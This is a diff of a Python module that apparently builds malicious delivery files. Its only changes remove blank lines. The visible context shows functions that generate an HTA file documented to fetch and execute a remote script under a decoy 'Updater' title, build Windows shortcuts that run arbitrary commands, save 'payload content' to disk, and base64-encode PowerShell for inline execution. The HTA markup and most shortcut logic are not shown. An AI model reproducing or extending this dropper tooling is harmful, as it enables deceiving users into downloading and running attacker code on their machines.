@@ -8,7 +8,6 @@ from textwrap import dedent
 
 __all__ = ["build_hta", "build_lnk", "save"]
 
-
 def build_hta(payload_url: str, *, title: str = "Updater") -> str:
     """Generate a minimal HTA that fetches and executes a remote script."""
     return dedent(
@@ -25,7 +24,6 @@ def build_hta(payload_url: str, *, title: str = "Updater") -> str:
         </html>
         """
     ).strip()
-
 
 def build_lnk(
     command: str, *, icon: str | None = None, workdir: str | None = None
@@ -44,13 +42,11 @@ def build_lnk(
     ps.append("$L.Save()")
     return "; ".join(ps)
 
-
 def save(content: str, path: str | Path) -> Path:
     """Persist generated payload content to disk."""
     out = Path(path).expanduser().resolve()
     out.write_text(content)
     return out
-
 
 def inline_base64_ps(script: str) -> str:
     """Encode a PowerShell script for inline execution."""
